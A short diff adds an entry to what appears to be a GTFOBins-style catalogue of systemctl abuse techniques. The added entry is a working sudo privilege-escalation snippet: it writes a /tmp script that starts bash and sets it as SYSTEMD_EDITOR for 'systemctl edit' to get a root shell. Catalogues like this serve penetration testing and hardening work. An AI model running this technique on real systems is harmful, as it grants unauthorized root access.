@@ -1,5 +1,14 @@
 ---
 functions:
+  shell:
+    - code: |
+        cat >/tmp/getshell <<EOF
+        #!/usr/bin/env bash
+        bash
+        EOF
+        chmod +x /tmp/getshell
+        sudo SYSTEMD_EDITOR=/tmp/getshell systemctl edit <SERVICE>
+    - description: This invokes the `SYSTEMD_EDITOR` that is specified. You could also just use `vi` and start a subshell manually.
   suid:
     - code: |
         TF=$(mktemp).service
